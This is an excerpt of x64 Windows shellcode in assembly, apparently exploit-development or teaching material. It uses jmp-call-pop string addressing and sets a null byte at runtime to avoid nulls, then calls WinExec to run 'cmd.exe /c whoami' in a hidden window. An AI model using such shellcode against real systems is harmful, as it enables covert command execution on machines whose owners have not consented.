...
_cmd:
  pop  rcx
  xor  rdx, rdx                    ; SW_HIDE (WinExec argument #2)
  mov  [rcx + cmd.len], r12b       ; get message pointer and add NULL termination to string
  call rax                         ; WinExec(cmd, SW_HIDE(0))
...
cmd:
  call _cmd
.string:
  db "cmd.exe /c whoami", 0x30 ; NULL byte set at runtime
.len: equ $ - cmd.string - 0x1 ; 1 byte offset to point to temp 0x30 byte
